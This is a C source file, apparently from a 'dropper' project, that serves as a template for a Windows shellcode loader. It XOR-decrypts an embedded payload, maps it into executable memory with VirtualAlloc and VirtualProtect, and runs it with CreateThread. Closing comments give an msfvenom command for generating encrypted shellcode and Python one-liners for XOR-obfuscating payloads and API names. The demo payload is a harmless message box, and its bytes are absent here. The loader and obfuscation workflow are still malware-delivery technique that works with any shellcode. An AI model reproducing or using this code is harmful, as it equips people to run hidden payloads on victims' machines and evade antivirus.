/**
 * @file examples/pe/ex3.c
 * @author adamr88 (adamr88@github.com)
 * @brief Encrypted WinAPI MessageBox shellcode
 * @version 0.1
 * @date 2024-01-04
 *
 * @copyright Copyright (c) 2024
 *
 */

#ifdef _WIN32
#include <windows.h>
#pragma comment(lib, "user32.lib")
#pragma comment(linker, "/subsystem:console")
#else
#include <stub/windows.h>
#endif

#include <dropper/assert.h>
#include <dropper/enc.h>

enum { SRCLEN = 334, KEYLEN = 26, MAX_TIMEOUT = 4294967295 };

// "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
const unsigned char key[] = {0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47,
                             0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e,
                             0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55,
                             0x56, 0x57, 0x58, 0x59, 0x5a};

unsigned char src[] = {
    // TITLE="Message Box"
    // TEXT="Press okay to continue ... "
    };

int main() {
  // allocate virtual memory buf
  void *lpbuf =
      VirtualAlloc(0, SRCLEN, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  AssertNotNull(lpbuf, VirtualAlloc, -1 * __LINE__);

  xormut(src, SRCLEN, key, KEYLEN);

  // copy payload to virtual memory buf
  RtlMoveMemory(lpbuf, src, SRCLEN);

  // change virtual memory buf execution permissions
  DWORD lpflOldProtect = 0;
  Assert(VirtualProtect(lpbuf, SRCLEN, PAGE_EXECUTE_READ, &lpflOldProtect));

  // execute payload (in thread/subprocess)
  HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpbuf, 0, 0, 0);
  AssertNotNull(th, CreateThread, -1 * __LINE__);

  // clean up threads and memory
  WaitForSingleObject(th, MAX_TIMEOUT);
  Assert(CloseHandle(th));
  Assert(VirtualFree(lpbuf, SRCLEN, MEM_RELEASE));
  return 0;
}

// clang-format off

/**
 * @note
 * Generate message box shell code
 * msfvenom -p windows/x64/messagebox TEXT="Press okay to continue ... " TITLE="Message Box" -f c --encrypt xor --encrypt-key "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 *
 * Python hex encode one-liner
 * echo -n 'KEY' | python -c 'import sys; print("unsigned char key[] = {%s};" % (", ".join([str(hex(ord(ch))) for ch in sys.stdin.read()])))'
 * 
 * Usage
 * echo -n 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' | python -c 'import sys; print("const unsigned char key[] = {%s};" % (", ".join([str(hex(ord(ch))) for ch in sys.stdin.read()])))'
 * 
 * Python xor encrypt one-liner 
 * echo -n 'PAYLOAD' | python -c 'import sys, operator as op, itertools as it; kcy=it.cycle(sys.argv[1]); print("unsigned char payload[] = {%s};" % ", ".join(list(map(hex, map(lambda tup: op.xor(*tup), map(lambda tup: tuple(map(ord, tup)), zip([ch for ch in sys.stdin.read() if ch != "\n"], kcy)))))))' $(echo -n 'KEY');
 * 
 * Usage
 * echo -n 'VirtualProtect' | python -c 'import sys, operator as op, itertools as it; kcy=it.cycle(sys.argv[1]); print("unsigned char payload[] = {%s};" % ", ".join(list(map(hex, map(lambda tup: op.xor(*tup), map(lambda tup: tuple(map(ord, tup)), zip([ch for ch in sys.stdin.read() if ch != "\n"], kcy)))))))' $(echo -n 'ABCDEFGHIJKLMNOPQRSTUVWXYZ');
 */